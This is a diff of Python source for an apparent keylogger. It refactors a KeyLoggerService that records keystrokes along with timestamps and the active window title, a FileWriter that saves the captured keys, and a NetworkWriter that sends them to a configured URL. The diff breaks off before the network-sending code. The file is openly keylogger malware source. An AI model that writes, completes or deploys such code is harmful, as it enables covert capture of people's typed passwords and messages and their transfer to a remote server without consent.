@@ -1,5 +1,6 @@
-import requests,time,ToolBox,pygetwindow,json,os,base64,yaml
-from Interface import IKeyLogger,Write
+import requests,time,pygetwindow,json,os,base64,yaml
+import utils
+from Interface import IKeyLogger,IWrite
 
 with open("config.yaml", "r") as f:
     config = yaml.safe_load(f)
@@ -14,8 +15,8 @@ class KeyLoggerService(IKeyLogger):
         self.__last_type_time = None
         self.__last_window = None
 
-    def on_press(self, key) -> None:
-        key = ToolBox.format_key(key)
+    def on_press(self, key:str) -> None:
+        key = utils.format_key(key)
         if key == "":
             return
         current_time = time.time()
@@ -32,14 +33,13 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        return self.__logged_keys
-
-    def clear_logged_keys(self) -> dict[str:str]:
+        temp_log = self.__logged_keys
         self.__logged_keys = {}
+        return temp_log
 
-class FileWriter(Write):
+class FileWriter(IWrite):
     def __init__(self):
-        self.path = ToolBox.get_file_path()
+        self.path = utils.get_file_path()
 
     def write(self, sn, data: dict[str:str]) -> bool:
         try:
@@ -61,7 +61,7 @@ class FileWriter(Write):
         except (IOError, json.JSONDecodeError):
             return False
 
-class NetworkWriter(Write):
+class NetworkWriter(IWrite):
     def __init__(self):
         self.url =  URL
     def write(self, serial_number, data:dict[str:str]) -> bool:
